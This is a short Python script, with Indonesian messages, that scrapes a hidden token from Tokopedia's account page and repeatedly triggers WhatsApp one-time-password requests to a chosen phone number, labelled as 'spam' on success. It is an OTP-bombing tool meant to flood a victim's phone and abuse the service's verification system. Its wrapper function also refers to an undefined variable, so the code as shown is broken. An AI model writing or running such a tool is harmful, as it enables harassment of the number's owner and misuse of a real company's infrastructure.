import re, requests, time
numbTime=[]
def tokped(number):
    kirim = {
        'User-Agent' : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.46 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        'Accept-Encoding' : 'gzip, deflate',
        'Connection' : 'keep-alive',
        'Origin' : 'https://accounts.tokopedia.com',
        'Accept' : 'application/json, text/javascript, */*; q=0.01',
        'X-Requested-With' : 'XMLHttpRequest',
        'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'
    }
    regist = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+number+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = kirim).text
    Token = re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', regist).group(1)
    formulir = {
        "otp_type" : "116",
        "msisdn" : number,
        "tk" : Token,
        "email" : '',
        "original_param" : "",
        "user_id" : "",
        "signature" : "",
        "number_otp_digit" : "6"
    }
    req = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = kirim, data = formulir).json()
    print(req)
    if req.get("success"):
        return f'Spamm Tokped {number} Success!'
    elif "anda sudah" in req.get("error_message").lower():
        return req.get("error_message")
    else:
        return f'Tokped {number} Fail!'
def spamTokped(num):
    if num:
        for i in numbTime:
                if i[1] == match[1]:
                    if time.time()-i[0] < 60:
                        return f"Harap Tunggu {60-int(time.time()-i[0])} Detik Untuk Melakukan Spam Berikutnya "
                    elif time.time()-i[0] > 60:
                        numbTime.remove(i)
        else:
            numbTime.append([time.time(), match[1]])
            return tokped(match[1])
    else:
        return "Masukan Nomer Telepon Dengan Benar"